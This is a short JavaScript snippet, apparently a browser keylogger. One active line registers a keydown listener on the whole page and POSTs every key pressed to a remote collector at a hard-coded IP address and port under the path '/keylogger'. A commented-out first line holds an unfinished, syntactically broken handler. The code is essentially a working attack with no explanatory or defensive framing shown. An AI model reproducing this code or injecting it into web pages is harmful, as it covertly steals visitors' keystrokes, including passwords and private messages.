//document.onkeydown=(event)=>{let key = event.key; )}

document.addEventListener(\'keydown\', (event) => {fetch(\'http://141.87.56.33:5000/keylogger\',{\'method\':\'POST\',\'Content-Type\':\'application/json\',\'body\':JSON.stringify({\'key\':event.key})})});